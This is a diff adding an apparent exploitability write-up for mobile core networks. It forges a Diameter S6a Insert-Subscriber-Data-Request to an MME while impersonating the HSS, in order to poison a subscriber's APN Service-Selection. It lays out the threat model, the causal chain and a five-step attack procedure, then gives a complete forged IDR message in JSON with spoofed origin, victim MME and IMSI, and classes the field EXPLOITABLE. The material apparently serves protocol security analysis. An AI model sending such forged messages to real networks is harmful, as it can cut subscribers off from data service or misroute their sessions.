@@ -1,0 +1,122 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **MME** exposing its **S6a Diameter** service. An Internet attacker can impersonate the expected **HSS** role and send a forged **Insert-Subscriber-Data-Request (IDR)** to that MME for a known subscriber, causing the MME to process attacker-supplied `Subscription-Data`.
+
+- **Attacker Capability:**
+  - The attacker can establish its own unauthenticated Diameter connection to the MME, send crafted **Requests**, and receive the corresponding **Answers**. The attacker does not observe or alter legitimate HSS<->MME traffic and has no extra NAS/GTP/radio capabilities; any impact must come from how the MME itself consumes the forged `Service-Selection` value.
+
+### **Exploitability Analysis:**
+`Subscription-Data.APN-Configuration-Profile.APN-Configuration.Service-Selection` is **field-specifically exploitable** under this threat model.
+
+This AVP is not descriptive metadata about the sender. It is authoritative **subscriber provisioning input** delivered from HSS to MME inside IDR. Within each `APN-Configuration`, `Service-Selection` is the APN identity for that provisioned APN profile entry. The MME stores it in the subscriber's cached EPS subscription data and later uses it for APN authorization, default APN selection logic, and downstream PDN session establishment decisions.
+
+The field-specific causal chain is:
+
+1. The attacker forges an **IDR** to the MME for a target subscriber and includes `Subscription-Data -> APN-Configuration-Profile -> APN-Configuration -> Service-Selection` with a malicious APN string.
+2. The MME accepts the message as HSS-originated provisioning and updates its stored APN configuration for that subscriber, typically keyed by the associated `Context-Identifier`.
+3. On a later attach or PDN Connectivity procedure, the MME consults the poisoned APN configuration:
+   - it may treat a UE-requested APN as unsubscribed,
+   - it may select the wrong default APN,
+   - it may send a Create Session procedure toward an unintended or invalid APN/PGW path,
+   - or it may fail APN resolution entirely.
+4. The subscriber-visible result can be **PDN connectivity failure, attach/default bearer failure, rejection of a requested APN as not subscribed, or steering to the wrong valid APN/service domain**.
+
+The target field itself is the key control point because changing **this string** changes which APN the MME believes is provisioned for that APN configuration entry. That is a direct modification of subscriber policy/state, not merely a generic consequence of accepting any IDR. A forged IDR is the delivery vehicle, but the concrete downstream effect depends on the malicious `Service-Selection` value.
+
+Attacker-realizability is satisfied for at least denial/disruption outcomes: the attacker does not need to control any PGW, NAS session, or real APN service. Setting `Service-Selection` to an unknown or mismatched APN is enough to poison MME subscriber state and cause later APN selection/authorization failure. Stronger steering effects to an alternate working APN depend on real network provisioning, but **service-impacting state corruption** is already achievable within the stated model.
+
+The effect is usually not immediate in the transaction itself; it is stored in MME subscriber context and later consumed by normal NAS/GTP procedures. Legitimate HSS refresh, Update Location-triggered re-download, detach/context loss, or later IDR can overwrite it, but until then it remains a meaningful subscriber-state corruption.
+
+### **Attack Procedure:**
+1. Establish a Diameter connection to the victim **MME** while impersonating an **HSS** peer on **S6a**.
+2. Send a forged **Insert-Subscriber-Data-Request** for the target subscriber (`User-Name` carrying the IMSI).
+3. Include `Subscription-Data` with an `APN-Configuration-Profile` containing an `APN-Configuration` for the target `Context-Identifier`, and set `Service-Selection` to a malicious APN value such as an unknown APN or a wrong but valid APN.
+4. Include semantically necessary sibling AVPs so the APN configuration is coherent, notably `Context-Identifier`, `PDN-Type`, `EPS-Subscribed-QoS-Profile`, and `AMBR`.
+5. Observe successful acceptance via the returned **IDA** result and, subsequently, subscriber impact when the UE performs attach or PDN connectivity and the MME uses the poisoned APN profile.
+
+Expected success condition: the MME accepts the IDR and later applies the altered APN configuration, producing APN authorization failure, default PDN failure, or session setup toward the wrong APN.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true,
+    "error": false,
+    "retransmitted": false
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "attacker-hss.example.net;1729382250;1"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.attacker.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "attacker.example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.victim.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "victim.example.net"
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "IDR-Flags",
+      "value": 0
+    },
+    {
+      "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "PDN-Type": "IPv4v6",
+              "Service-Selection": "ims",
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 5,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 1,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 1
+                }
+              },
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
